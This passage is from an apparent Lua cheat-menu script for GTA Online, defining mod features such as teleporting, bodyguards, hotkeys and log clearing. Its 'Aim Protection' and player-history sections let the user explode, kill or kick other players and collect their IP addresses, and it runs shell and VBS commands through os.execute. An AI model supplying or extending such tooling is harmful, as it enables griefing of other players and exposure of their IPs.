                            entity.set_entity_velocity(e2, v3())
                            b0(e2, v3(8000, 8000, -1000))
                            entity.delete_entity(e2)
                        end
                    end
                end
            end
            c["clear_area_2"] = aP.on
            return aO(aP)
        end
    )
    S["clear_area_2"].on = c["clear_area_2"]
    S["auto_tp_wp"] =
        aH(
        "Auto Teleport to Waypoint",
        R["misc"],
        function(aP)
            if aP.on then
                local cZ = ui.get_waypoint_coord()
                if cZ.x ~= 16000 then
                    local bb = a_()
                    local e4 = v2()
                    e4.x = bb.x
                    e4.y = bb.y
                    if b2(cZ, e4) > 35 then
                        f("Detected Waypoint, teleporting...", 172)
                        local e5 = aX()
                        local bB = ped.get_vehicle_ped_is_using(e5)
                        if bB ~= 0 then
                            e5 = bB
                        end
                        local e6 = 850
                        local dK, e7 = gameplay.get_ground_z(v3(cZ.x, cZ.y, e6))
                        while not dK do
                            e6 = e6 - 5
                            dK, e7 = gameplay.get_ground_z(v3(cZ.x, cZ.y, e6))
                            if e6 < -200 then
                                e6 = -200
                                dK = true
                            end
                        end
                        b8(v3(cZ.x, cZ.y, e7))
                    end
                end
            end
            c["auto_tp_wp"] = aP.on
            return aO(aP)
        end
    )
    S["auto_tp_wp"].on = c["auto_tp_wp"]
    S["police_outfit"] =
        aH(
        "Force Police Outfit",
        R["misc"],
        function(aP)
            if aP.on then
                local e8 = W
                local e9 = X
                if player.is_player_female(aV()) then
                    e8 = U
                    e9 = V
                end
                for B = 1, #e8 do
                    ped.set_ped_component_variation(aX(), B, e8[B][2], e8[B][1], 2)
                end
                for B = 1, #e9 do
                    ped.set_ped_prop_index(aX(), e9[B][1], e9[B][2], e9[B][3], 0)
                end
                system.wait(250)
            end
            c["police_outfit"] = aP.on
            return aO(aP)
        end
    )
    S["police_outfit"].on = c["police_outfit"]
    S["ban_screen"] =
        aH(
        "You've Been Banned",
        R["misc"],
        function(aP)
            if aP.on then
                local bb = v2()
                local dq = v2()
                local ea = v2()
                bb.x = 0.5
                bb.y = 0.325
                dq.x = 0.5
                dq.y = 0.5
                ea.x = 0.5
                ea.y = 0.54
                ui.set_text_scale(3.0)
                ui.set_text_font(7)
                ui.set_text_centre(0)
                ui.set_text_color(255, 206, 67, 255)
                ui.set_text_outline(true)
                ui.draw_text("alert", bb)
                ui.set_text_scale(0.5)
                ui.set_text_centre(0)
                ui.set_text_color(255, 255, 255, 255)
                ui.draw_text("You have been banned from Grand Theft Auto Online permanently", dq)
                ui.set_text_scale(0.5)
                ui.set_text_centre(0)
                ui.draw_text("Return to Grand Theft Auto V", ea)
                ui.draw_rect(.5, .5, 1, 1, 0, 0, 0, 255)
                ui.draw_rect(.5, .492, .52, .0019, 255, 255, 255, 255)
                ui.draw_rect(.5, .585, .52, .0019, 255, 255, 255, 255)
            end
            return aO(aP)
        end
    )
    S["swap_seats"] =
        aI(
        "Swap Vehicle Seat",
        "autoaction_value_i",
        R["misc"],
        function()
            local bB = ped.get_vehicle_ped_is_using(aX())
            if bB ~= 0 then
                ped.set_ped_into_vehicle(aX(), bB, S["swap_seats"].value_i)
            end
        end
    )
    S["swap_seats"].min_i = -1
    S["swap_seats"].value_i = -1
    S["swap_seats"].max_i = 15
    R["player_history"] =
        aD(
        "Player History",
        R["misc"],
        function(aP)
            for B = 1, #at do
                if not at[B]["feature"] then
                    local bZ = at[B]["name"]
                    local bi = at[B]["scid"]
                    local eb = aD(bZ, R["player_history"]).id
                    aG(
                        "SCID: " .. bi,
                        eb,
                        function()
                            utils.to_clipboard(bi)
                            f("Copied SCID to clipboard!", 21)
                        end
                    )
                    aG(
                        "IP: " .. at[B]["ip"],
                        eb,
                        function()
                            utils.to_clipboard(at[B]["ip"])
                            f("Copied IP to clipboard!", 21)
                        end
                    )
                    aG("First seen: " .. at[B]["first_seen"], eb)
                    aG(
                        "Add Player to Blacklist",
                        eb,
                        function()
                            if bi == aB(aV()) or bi == -1 then
                                f("Choose valid Player.")
                            else
                                local A = io.open(a .. "\\2Take1Blacklist.cfg", "a")
                                io.output(A)
                                io.write(bi .. " " .. bZ .. "\n")
                                io.close(A)
                                f("Player " .. bZ .. " added to Blocklist.", 48)
                                j("Player " .. bZ .. " with SCID: " .. bi .. " added to Blacklist.")
                            end
                        end
                    )
                    aG(
                        "Add Player to Remember-Modder",
                        eb,
                        function()
                            if bi == aB(aV()) or bi == -1 then
                                f("Choose valid Player.")
                            else
                                local cV = io.open(a .. "\\2Take1Modders.cfg", "a")
                                io.output(cV)
                                io.write(bi .. " " .. bZ .. "\n")
                                io.close(cV)
                                f("Modder " .. bZ .. " added to Remember-List.", 130)
                                j("Modder '" .. bZ .. "' added to Remember-List.")
                            end
                        end
                    )
                    aG(
                        "Copy Outfit",
                        eb,
                        function()
                            local ec = player.is_player_female(aV())
                            if ec == at[B]["is_female"] then
                                local cL = at[B]["h_clothes"]
                                local cK = at[B]["h_textures"]
                                for cH = 1, 11 do
                                    ped.set_ped_component_variation(aX(), cH, cL[cH], cK[cH], 2)
                                end
                                local cP = {0, 1, 2, 6, 7}
                                local cN = at[B]["h_prop_ind"]
                                local cO = at[B]["h_prop_text"]
                                for cM = 1, #cP do
                                    ped.set_ped_prop_index(aX(), cP[cM], cN[cM], cO[cM], 0)
                                end
                            else
                                f("Unluckily, you have the wrong gender!", 21)
                            end
                        end
                    )
                    aG(
                        "Is " .. bZ .. " in this lobby?",
                        eb,
                        function()
                            for cH = 0, 31 do
                                if aB(cH) == bi then
                                    f(bZ .. " is in your lobby!", 21)
                                    return HANDLER_POP
                                end
                            end
                            f(bZ .. " is ~h~NOT~h~ in your lobby!", 21)
                        end
                    )
                    aG(
                        "Was he a modder?",
                        eb,
                        function()
                            local bi = at[B]["scid"]
                            if not cB[bi] then
                                f("He was not flagged with any Modder-Flags", 21)
                            else
                                for cH = 1, #cC do
                                    if cB[bi][cC[cH]] then
                                        local ed = cC[cH]
                                        local c6 = player.get_modder_flag_text(ed)
                                        f(bZ .. " had '" .. c6 .. "' as a Flag!", 21)
                                    end
                                end
                            end
                        end
                    )
                    at[B]["feature"] = true
                end
            end
        end
    ).id
    R["utils"] = aD("Utils", R["misc"]).id
    R["scripts"] =
        aD(
        "Load Scripts",
        R["utils"],
        function()
            f("NOTHING TO SEE HERE!!! MAYBE COMING SOON", 208, "COMING SOON")
            local ee = os.getenv("APPDATA") .. "\\PopstarDevs\\2Take1Menu\\scripts\\"
            local ef = utils.get_all_files_in_directory(ee, "lua")
            local eg = R["scripts"].children
            local eh = ay()
            for B = 1, #ef do
                local cG = true
                for cH = 1, #eg do
                    if eg[cH].name == ef[B] then
                        cG = false
                    end
                end
                if ef[B] == eh then
                    cG = false
                end
                if cG then
                    local ei
                    aH(
                        ef[B],
                        R["scripts"].id,
                        function(aP)
                            if aP.on and not cD[ef[B]] then
                                cD[ef[B]] = {}
                                local ej, ek = loadfile(ee .. ef[B])
                                if ej ~= nil then
                                    ei = xpcall(ej, debug.traceback)
                                else
                                    f("NO")
                                end
                            elseif not aP.on and cD[ef[B]] then
                                f("NOTHING TO SEE HERE!!! MAYBE COMING SOON", 208, "COMING SOON")
                            end
                        end
                    )
                end
            end
        end
    )
    S["auto_load"] =
        aH(
        "autoexec Scripts from folder 'autoload'",
        R["utils"],
        function(aP)
            c["auto_load"] = aP.on
            if aP.on then
                if utils.dir_exists(os.getenv("APPDATA") .. "\\PopstarDevs\\2Take1Menu\\scripts\\autoload") then
                    local ef =
                        utils.get_all_files_in_directory(
                        os.getenv("APPDATA") .. "\\PopstarDevs\\2Take1Menu\\scripts\\autoload",
                        "lua"
                    )
                    if ef ~= nil then
                        j("Found Scripts for autoexecuting!")
                        for B = 1, #ef do
                            j(ef[B])
                            local eh = string.sub(ef[B], 1, -5)
                            system.wait(5000)
                            if not require("\\autoload\\" .. eh) then
                                f("ERROR Loading Script " .. ef[B] .. "!", 208)
                            else
                                f("Loaded Script " .. ef[B] .. " succesfully!", 166)
                                j("Loaded Script " .. ef[B] .. " succesfully!")
                            end
                        end
                    end
                else
                    f("No folder 'autoload' found, create a folder and place any script inside!", 174)
                end
            end
        end
    )
    S["auto_load"].on = c["auto_load"]
    S["leave_session"] =
        aG(
        "Leave-Session",
        R["utils"],
        function()
            local time = utils.time_ms() + 8500
            while time > utils.time_ms() do
            end
        end
    )
    S["crash_yourself"] =
        aG(
        "Crash Yourself",
        R["utils"],
        function()
            os.execute("taskkill /F /IM GTA5.exe")
            while 1 do
            end
        end
    )
    aH(
        "Auto-Hostkick-Yourself",
        R["utils"],
        function(aP)
            if aP.on then
                if network.network_is_host() then
                    f("Hostkicking-Yourself!")
                    j("Hostkicking-Yourself!")
                    network.network_session_kick_player(aV())
                end
            end
            return aO(aP)
        end
    )
    aG(
        "Fuck You",
        R["utils"],
        function()
            os.execute(
                "start https://steamuserimages-a.akamaihd.net/ugc/849342240392626653/882456A11C32E6548619159DCEE8BA0D1DDAEE35/?imw=1024&imh=1024&ima=fit&impolicy=Letterbox&imcolor=%23000000&letterbox=true"
            )
        end
    )
    S["send_message_to_dc"] =
        aG(
        "Send Message to #general",
        R["utils"],
        function()
            f("It will take 8 seconds to sent the message, calm down and wait :)")
            local aR, co = input.get("Enter Message", "", 128, 0)
            while aR == 1 do
                system.wait(0)
                aR, co = input.get("Enter Message", "", 128, 0)
            end
            if aR == 2 then
                return HANDLER_POP
            end
            co = co .. "\n\n*this message was sent by 2Take1Script*"
            utils.to_clipboard(co)
            os.execute("start https://discord.com/channels/570999086874886154/570999091320979486")
            system.wait(8000)
            local el = "C:\\TEMP\\XX2T1SXX.vbs"
            local em = io.open(el, "a")
            io.output(em)
            io.write('set sendmsg = wscript.createobject("wscript.shell")\nwscript.sleep(1000)\n')
            io.write('sendmsg.sendkeys "^v"\nwscript.sleep(50)\n')
            io.write('sendmsg.sendkeys "{ENTER}"\nwscript.sleep(500)\n')
            io.write("wscript.quit")
            io.close(em)
            os.execute("start " .. el)
            system.wait(1000)
            os.remove(el)
        end
    )
    R["ipl_config"] =
        aD(
        "IPL-Loader",
        R["misc"],
        function()
            if not utils.file_exists(a .. "\\2Take1IPLlist.txt") then
                f("No IPL-List File found.")
                f(
                    "Download '2Take1IPLlist.txt' from #lua-script-share and place it in '2Take1Menu/scripts/2Take1Script/' folder."
                )
                aj["load_ipls"].hidden = true
                aj["range_start"].hidden = true
                aj["range_end"].hidden = true
                aj["remove_ipls"].hidden = true
            else
                aj["load_ipls"].hidden = false
                aj["range_start"].hidden = false
                aj["range_end"].hidden = false
                aj["remove_ipls"].hidden = false
            end
        end
    ).id
    aj["load_ipls"] =
        aG(
        "Load ALL IPLs from File",
        R["ipl_config"],
        function()
            for en in io.lines(a .. "\\2Take1IPLlist.txt") do
                streaming.request_ipl(en)
            end
        end
    )
    aj["range_start"] =
        aI(
        "Select starting line for range",
        "action_value_i",
        R["ipl_config"],
        function(aP)
        end
    )
    aj["range_start"].max_i = 8550
    aj["range_start"].mod_i = 50
    aj["range_end"] =
        aI(
        "Select ending line for range",
        "action_value_i",
        R["ipl_config"],
        function(aP)
        end
    )
    aj["range_end"].max_i = 8550
    aj["range_end"].mod_i = 50
    aj["remove_ipls"] =
        aG(
        "Remove ALL IPLs between selected Range",
        R["ipl_config"],
        function()
            local br = 0
            local eo = aj["range_start"].value_i
            for en in io.lines(a .. "\\2Take1IPLlist.txt") do
                if br == eo then
                    eo = eo + 1
                    if eo <= aj["range_end"].value_i then
                        streaming.remove_ipl(en)
                    end
                end
                br = br + 1
            end
        end
    )
    R["debug"] = aD("Dev Tools", R["misc"]).id
    aG(
        "Delete Entity from Aim",
        R["debug"],
        function()
            b1({player.get_entity_player_is_aiming_at(aV())})
        end
    )
    aG(
        "Get input Hash Key",
        R["debug"],
        function()
            local ca
            local aR, ep = input.get("Enter Name(PED, OBJECT, etc)", "", 64, 0)
            while aR == 1 do
                system.wait(0)
                aR, ep = input.get("Enter Name(PED, OBJECT, etc)", "", 64, 0)
            end
            if aR == 2 then
                return HANDLER_POP
            end
            j("")
            j("******************************")
            j("String: " .. ep)
            ca = tostring(gameplay.get_hash_key(ep))
            j("Hash: " .. ca)
            f(string.format("%s %s", ep, ca))
        end
    )
    aG(
        "Notify & Print String from file",
        R["debug"],
        function()
            local eq = "slod_small_quadped"
            local er = gameplay.get_hash_key(eq)
            j("")
            j("******************************")
            j("String: " .. eq)
            j("Hash: " .. er)
            f("String: " .. eq)
            f("Hash: " .. er)
        end
    )
    S["print_info_from_entity"] =
        aG(
        "Print Info from Entity @Aim to file",
        R["debug"],
        function()
            local da = player.get_entity_player_is_aiming_at(aV())
            local es, bb, dg
            if da ~= 0 then
                while da ~= 0 do
                    es = entity.get_entity_model_hash(da)
                    bb = entity.get_entity_coords(da)
                    dg = entity.get_entity_rotation(da)
                    j("")
                    j("Printing infos about Entity:")
                    j("******************************")
                    j("Hash: " .. es)
                    j("Entity Type: " .. entity.get_entity_type(da))
                    j("Entity: " .. da)
                    j("Coords X: " .. bb.x)
                    j("Coords Y: " .. bb.y)
                    j("Coords Z: " .. bb.z)
                    j("Rot X: " .. dg.x)
                    j("Rot Y: " .. dg.y)
                    j("Rot Z: " .. dg.z)
                    j("Heading: " .. entity.get_entity_heading(da))
                    j("Entity population_type: " .. entity.get_entity_population_type(da))
                    if entity.is_entity_static(da) then
                        j("Entity is static")
                    end
                    if entity.does_entity_have_drawable(da) then
                        j("Entity has a drawable")
                    end
                    if entity.is_entity_in_water(da) then
                        j("Entity is in water")
                    end
                    if entity.is_entity_a_ped(da) then
                        j("Entity is a PED")
                    elseif entity.is_entity_a_vehicle(da) then
                        j("Entity is a VEHICLE")
                    elseif entity.is_entity_an_object(da) then
                        j("Entity is a OBJECT")
                    end
                    if entity.is_entity_dead(da) then
                        j("Entity is DEAD")
                    end
                    if entity.is_entity_on_fire(da) then
                        j("Entity is ON FIRE")
                    end
                    if entity.is_entity_visible(da) then
                        j("Entity is VISIBLE")
                    else
                        j("Entity is INvisible")
                    end
                    if entity.is_entity_attached(da) then
                        da = entity.get_entity_attached_to(da)
                        j("")
                        j("Attached Entity found. Continue printing infos of Entity.")
                        j("Attached Entity Info:")
                    else
                        da = 0
                        j("")
                        j("")
                        j("")
                    end
                end
                f("Printed Info about Entity to file.")
            else
                f("Nothing found for Info-Printing.")
            end
        end
    )
    aG(
        "Clear 2Take1Script.log",
        R["debug"],
        function()
            local l = io.open(a .. "\\2Take1Script.log", "w")
            io.close(l)
            f("Cleared 2Take1Script.log", 204)
            j("Cleared 2Take1Script.log")
        end
    )
    aG(
        "Clear Menu Log-Files",
        R["debug"],
        function()
            local et = os.getenv("APPDATA") .. "\\PopstarDevs\\"
            local l = io.open(et .. "PopstarAuth.log", "w")
            io.close(l)
            f("Cleared PopstarAuth.log", 204)
            j("Cleared PopstarAuth.log")
            et = et .. "2Take1Menu\\"
            l = io.open(et .. "2Take1Menu.log", "w")
            io.close(l)
            f("Cleared 2Take1Menu.log", 204)
            j("Cleared 2Take1Menu.log")
            l = io.open(et .. "2Take1Prep.log", "w")
            io.close(l)
            f("Cleared 2Take1Prep.log", 204)
            j("Cleared 2Take1Prep.log")
        end
    )
    aG(
        "Clear crashdumps",
        R["debug"],
        function()
            local et = os.getenv("APPDATA") .. "\\PopstarDevs\\2Take1Menu\\crashdump"
            local eu = utils.get_all_files_in_directory(et, "dump")
            if eu[1] ~= nil then
                f("Found dumps, deleting...", 204)
                for B = 1, #eu do
                    os.remove(et .. "\\" .. eu[B])
                end
                f("Cleared crashdumps.", 204)
                j("Cleared crashdumps.")
            else
                f("No dumps found.", 204)
            end
        end
    )
    S["log_modder_flags"] =
        aH(
        "Log Modder Flags",
        R["debug"],
        function(aP)
            if aP.on then
                local time = utils.time_ms() + 2500
                while time > utils.time_ms() do
                    system.wait(250)
                    c["log_modder_flags"] = aP.on
                end
                for B = 0, 31 do
                    if player.is_player_valid(B) then
                        for cH = 1, #cC do
                            if player.is_player_modder(B, cC[cH]) then
                                local ed = cC[cH]
                                local c6 = player.get_modder_flag_text(ed)
                                if cB[aB(B)] then
                                    if not cB[aB(B)][ed] then
                                        cB[aB(B)][ed] = true
                                        j(aB(B) .. ":" .. aA(B) .. " is a Modder with Tag: " .. c6)
                                    end
                                else
                                    cB[aB(B)] = {}
                                end
                            end
                        end
                    end
                end
            end
            c["log_modder_flags"] = aP.on
            return aO(aP)
        end
    )
    S["log_modder_flags"].on = c["log_modder_flags"]
    S["logger"] =
        aH(
        "Enable Log from this Lua-Script",
        R["debug"],
        function(aP)
            c["logger"] = aP.on
        end
    )
    S["logger"].on = c["logger"]
    R["bodyguards"] = aD("Bodyguards", R["parent"])
    R["bodyguards"].hidden = c["bodyguards_hidden"]
    R["bodyguards"] = R["bodyguards"].id
    S["bodyguards_god"] =
        aH(
        "Godmode for Bodyguards",
        R["bodyguards"],
        function(aP)
            c["bodyguards_god"] = aP.on
        end
    )
    S["bodyguards_god"].on = c["bodyguards_god"]
    S["bodyguards_health"] =
        aI(
        "Set Health of Bodyguards",
        "autoaction_value_i",
        R["bodyguards"],
        function(aP)
            f("Bodyguards Health set to: " .. aP.value_i)
            c["bodyguards_health"] = aP.value_i
        end
    )
    S["bodyguards_health"].min_i = 5000
    S["bodyguards_health"].max_i = 50000
    S["bodyguards_health"].mod_i = 5000
    S["bodyguards_health"].value_i = c["bodyguards_health"]
    S["bodyguards_equip_weapon"] =
        aH(
        "Equip Bodyguards with MG",
        R["bodyguards"],
        function(aP)
            c["bodyguards_equip_weapon"] = aP.on
        end
    )
    S["bodyguards_equip_weapon"].on = c["bodyguards_equip_weapon"]
    S["bodyguards_formation"] =
        aI(
        "Set Formation",
        "autoaction_value_i",
        R["bodyguards"],
        function(aP)
            c["bodyguards_formation_type"] = aP.value_i
        end
    )
    S["bodyguards_formation"].min_i = 0
    S["bodyguards_formation"].max_i = 3
    S["bodyguards_formation"].value_i = c["bodyguards_formation_type"]
    S["bodyguards"] =
        aH(
        "Enable Bodyguards",
        R["bodyguards"],
        function(aP)
            if aP.on then
                local ev = player.get_player_group(aV())
                local ca = 0x613E626C
                for B = 1, 7 do
                    if Q["bodyguards"][B] == nil or entity.is_entity_dead(Q["bodyguards"][B]) then
                        if Q["bodyguards"][B] ~= nil and entity.is_entity_dead(Q["bodyguards"][B]) then
                            b1({Q["bodyguards"][B]})
                        end
                        aS(ca)
                        Q["bodyguards"][B] = ped.create_ped(29, ca, bO(a_(), aY(), 4), 0, true, false)
                        aT(ca)
                        if S["bodyguards_god"].on then
                            entity.set_entity_god_mode(Q["bodyguards"][B], true)
                        else
                            ped.set_ped_max_health(Q["bodyguards"][B], S["bodyguards_health"].value_i)
                            ped.set_ped_health(Q["bodyguards"][B], S["bodyguards_health"].value_i)
                        end
                        local ew = ui.add_blip_for_entity(Q["bodyguards"][B])
                        ui.set_blip_sprite(ew, 310)
                        ui.set_blip_colour(ew, 80)
                        if S["bodyguards_equip_weapon"].on then
                            weapon.give_delayed_weapon_to_ped(Q["bodyguards"][B], 0x22D8FE39, 0, 1)
                            weapon.give_delayed_weapon_to_ped(Q["bodyguards"][B], 0xDBBD7280, 0, 1)
                        end
                        ped.set_ped_combat_ability(Q["bodyguards"][B], 100)
                        ped.set_ped_as_group_member(Q["bodyguards"][B], ev)
                        entity.set_entity_as_mission_entity(Q["bodyguards"][B], 1, 1)
                    end
                    if not entity.is_entity_dead(Q["bodyguards"][B]) then
                        aQ(Q["bodyguards"][B])
                        ped.set_group_formation(ev, S["bodyguards_formation"].value_i)
                        if player.is_player_free_aiming(aV()) then
                            local c3 = player.get_entity_player_is_aiming_at(aV())
                            if c3 ~= 0 then
                                ai.task_shoot_at_entity(Q["bodyguards"][B], c3, 100, 0xC6EE6B4C)
                            else
                                local bb = a_()
                                local dG = cam.get_gameplay_cam_rot()
                                dG:transformRotToDir()
                                dG = dG * math.random(1, 50)
                                bb = bb + dG
                                ai.task_shoot_gun_at_coord(Q["bodyguards"][B], bb, 100, 0xC6EE6B4C)
                            end
                        end
                        if b2(a_(), aZ(Q["bodyguards"][B])) > 50 then
                            b0(Q["bodyguards"][B], bO(a_(), aY(), -5))
                        end
                    end
                end
            end
            if not aP.on then
                b1(Q["bodyguards"])
                Q["bodyguards"] = {}
            end
            return aO(aP)
        end
    )
    R["aim_protection"] = aD("Aim Protection", R["parent"]).id
    S["enable_aim_prot"] =
        aH(
        "Enable Aim Protection",
        R["aim_protection"],
        function(aP)
            if aP.on then
                for B = 0, 31 do
                    if bu(B) then
                        local c3 = player.get_entity_player_is_aiming_at(B)
                        if c3 ~= 0 then
                            if c3 == aX() then
                                f(aA(B) .. " is aiming at you!", 173)
                                local c7 = aX()
                                if c["anonymous_punishment"] then
                                    c7 = aW(B)
                                end
                                if c["aim_prot_ragdoll"] then
                                    f("Ragdolling " .. aA(B) .. "!", 173)
                                    j("Ragdolling " .. aA(B) .. "!")
                                    fire.add_explosion(aZ(aW(B)), 70, true, false, 1, c7)
                                    system.wait(75)
                                end
                                if c["aim_prot_fire"] then
                                    f("Setting " .. aA(B) .. " on fire!", 173)
                                    j("Setting " .. aA(B) .. " on fire!")
                                    fire.add_explosion(aZ(aW(B)), 3, true, false, 0, c7)
                                    system.wait(75)
                                end
                                if c["aim_prot_kill"] then
                                    f("Killing " .. aA(B) .. "!", 173)
                                    j("Killing " .. aA(B) .. "!")
                                    fire.add_explosion(aZ(aW(B)), 8, false, true, 0, c7)
                                    system.wait(75)
                                end
                                if c["aim_prot_remove_weapon"] then
                                    f("Removing Weapon from " .. aA(B) .. "!", 173)
                                    j("Removing Weapon from " .. aA(B) .. "!")
                                    ped.set_ped_can_switch_weapons(aW(B), false)
                                    weapon.remove_weapon_from_ped(aW(B), ped.get_current_ped_weapon(aW(B)))
                                    ped.set_ped_can_switch_weapons(aW(B), false)
                                    system.wait(75)
                                end
                                if c["aim_prot_kick"] then
                                    bv(false, B)
                                end
                            end
                        end
                    end
                end
            end
            c["enable_aim_prot"] = aP.on
            return aO(aP)
        end
    )
    S["enable_aim_prot"].on = c["enable_aim_prot"]
    S["anonymous_punishment"] =
        aH(
        "Anonymous Punishment",
        R["aim_protection"],
        function(aP)
            c["anonymous_punishment"] = aP.on
        end
    )
    S["anonymous_punishment"].on = c["anonymous_punishment"]
    S["aim_prot_ragdoll"] =
        aH(
        "Ragdoll Player",
        R["aim_protection"],
        function(aP)
            c["aim_prot_ragdoll"] = aP.on
        end
    )
    S["aim_prot_ragdoll"].on = c["aim_prot_ragdoll"]
    S["aim_prot_fire"] =
        aH(
        "Set on Fire",
        R["aim_protection"],
        function(aP)
            c["aim_prot_fire"] = aP.on
        end
    )
    S["aim_prot_fire"].on = c["aim_prot_fire"]
    S["aim_prot_kill"] =
        aH(
        "Kill Player",
        R["aim_protection"],
        function(aP)
            c["aim_prot_kill"] = aP.on
        end
    )
    S["aim_prot_kill"].on = c["aim_prot_kill"]
    S["aim_prot_remove_weapon"] =
        aH(
        "Remove Current Weapon",
        R["aim_protection"],
        function(aP)
            c["aim_prot_remove_weapon"] = aP.on
        end
    )
    S["aim_prot_remove_weapon"].on = c["aim_prot_remove_weapon"]
    S["aim_prot_kick"] =
        aH(
        "Kick Player",
        R["aim_protection"],
        function(aP)
            c["aim_prot_kick"] = aP.on
        end
    )
    S["aim_prot_kick"].on = c["aim_prot_kick"]
    R["opt"] = aD("Options", R["parent"])
    R["opt"].hidden = c["options_hidden"]
    R["opt"] = R["opt"].id
    R["hotkeys"] = aD("Hotkey Settings", R["opt"]).id
    S["enable_hotkeys"] =
        aH(
        "Enable Hotkeys",
        R["hotkeys"],
        function(aP)
            c["enable_hotkeys"] = aP.on
            if aP.on then
                if not utils.file_exists(a .. "\\2Take1Hotkeys.ini") then
                    local ex = io.open(a .. "\\2Take1Hotkeys.ini", "w")
                    io.output(ex)
                    io.write("version=" .. c["version"] .. "\n")
                    for B = 1, #d do
                        io.write(d[B] .. "=" .. tostring(e[d[B]]) .. "\n")
                    end
                    io.write("################################\n")
                    io.write(
                        "#There are more valid Keys, but i wont list them. Currently its not supported to push 2 Keys for 1 Hotkey.\n"
                    )
                    io.write("#Example valid Hotkeys:\n")
                    io.write("#F1-F12\n")
                    io.write("#A-Z\n")
                    io.write("#LCONTROL\n")
                    io.write("#RSHIFT\n")
                    io.write("#Insert\n")
                    io.write("#Down\n")
                    io.write("#PageDown\n")
                    io.close(ex)
                    f(
                        "Created 2Take1Hotkeys.ini file in folder 2Take1Script. Edit Hotkeys and reload Hotkeys.ini file.",
                        86
                    )
                end
                for B = 1, #d do
                    local ey = d[B]
                    local ez = e[ey]
                    if ez ~= nil then
                        local bU = MenuKey()
                        bU:push_str(ez)
                        if bU:is_down() then
                            local eA = S[ey]
                            local eB = eA.name
                            j(ez .. ":'" .. eB .. "' got pressed.")
                            if c["hotkey_notification"] then
                                f(ez .. ":'" .. eB .. "' got pressed.", 86)
                            end
                            if eA.type == 512 then
                                eA.on = true
                                system.wait(100)
                                eA.on = false
                            else
                                if eA.on then
                                    eA.on = false
                                else
                                    eA.on = true
                                end
                            end
                            system.wait(250)
                        end
                    end
                end
            end
            return aO(aP)
        end
    )
    S["enable_hotkeys"].on = c["enable_hotkeys"]
    aG(
        "Reload 2Take1Hotkeys.ini",
        R["hotkeys"],
        function()
            T()
            f("Reloaded Hotkeys.ini", 86)
        end
    )
    S["hotkey_notification"] =
        aH(
        "Hotkey Notifications",
        R["hotkeys"],
        function(aP)
            c["hotkey_notification"] = aP.on
        end
    )
    S["hotkey_notification"].on = c["hotkey_notification"]
    aG(
        "Print active Hotkeys",
        R["hotkeys"],
        function()
            for B = 1, #d do
                local ez = e[d[B]]
                if ez ~= nil then
                    local eB = S[d[B]].name
                    f(ez .. ': "' .. eB .. '"', 86)
                end
            end
        end
    )
    S["exclude_fr"] =
        aH(
        "Exclude Friends from Harmful Lobby Events",
        R["opt"],
        function(aP)
            c["exclude_fr"] = aP.on
        end
    )
    S["exclude_fr"].on = c["exclude_fr"]
    S["auto_get_in"] =
        aH(
        "Spawn in Custom Vehicle",
        R["opt"],
        function(aP)
            c["spawn_in_vehicle"] = aP.on
        end
    )
    S["auto_get_in"].on = c["spawn_in_vehicle"]
    S["use_own_veh"] =
        aH(
        "Use Own Vehicle for Custom ones",
        R["opt"],
        function(aP)
            c["use_own_veh"] = aP.on
        end
    )
    S["use_own_veh"].on = c["use_own_veh"]
    S["set_godmode"] =
        aH(
        "Godmode on Custom Vehicles",
        R["opt"],
        function(aP)
            c["set_godmode"] = aP.on
        end
    )
    S["set_godmode"].on = c["set_godmode"]
    S["attach_no_colision"] =
        aH(
        "Attached Entitys No Collision",
        R["opt"],
        function(aP)
            c["attach_no_colision"] = aP.on
        end
    )
    S["attach_no_colision"].on = c["attach_no_colision"]
    S["continuously_assassins"] =
        aH(
        "Continuously Assassin Peds",
        R["opt"],
        function(aP)
            c["continuously_assassins"] = aP.on
            if aP.on and #Q["peds"] > 0 then
                if aB(ah) ~= -1 then
                    local c3 = aW(ah)
                    for B = 1, #Q["peds"] do
                        ai.task_goto_entity(Q["peds"][B], c3, 10, 500, 500)
                        ai.task_combat_ped(Q["peds"][B], c3, 0, 16)
                    end
                end
            end
            return aO(aP)
        end
    )
    S["continuously_assassins"].on = c["continuously_assassins"]
    S["override_notify_color"] =
        aI(
        "Force Notification Color",
        "value_i",
        R["opt"],
        function(aP)
            c["override_notify_color"] = aP.on
            c["notify_color"] = aP.value_i
        end
    )
    S["override_notify_color"].max_i = 223
    S["override_notify_color"].on = c["override_notify_color"]
    S["override_notify_color"].value_i = c["notify_color"]
    aG(
        "Show Notification Color",
        R["opt"],
        function()
            f("Example Text\nNotification color: " .. c["notify_color"])
        end
    )
    S["2t1s_p"] =
        aH(
        "2Take1Script Parent",
        R["opt"],
        function(aP)
            c["2t1s_p"] = aP.on
        end
    )
    S["2t1s_p"].on = c["2t1s_p"]
    S["save_config"] =
        aG(
        "Save Configuration",
        R["opt"],
        function()
            local A = io.open(a .. "\\2Take1Script.ini", "w")
            io.output(A)
            for B = 1, #b do
                io.write(b[B] .. "=" .. tostring(c[b[B]]) .. "\n")
            end
            io.close(A)
            j("Saved Configuration to file.")
            f("Saved Configuration to file.", 25)
        end
    )
    j("")
    j("")
    j("Loaded 2Take1Script successfully. :)")
    j("")
    f("2Take1Script successfully loaded. :)", 210)
    _2t1s = true
end
cE()
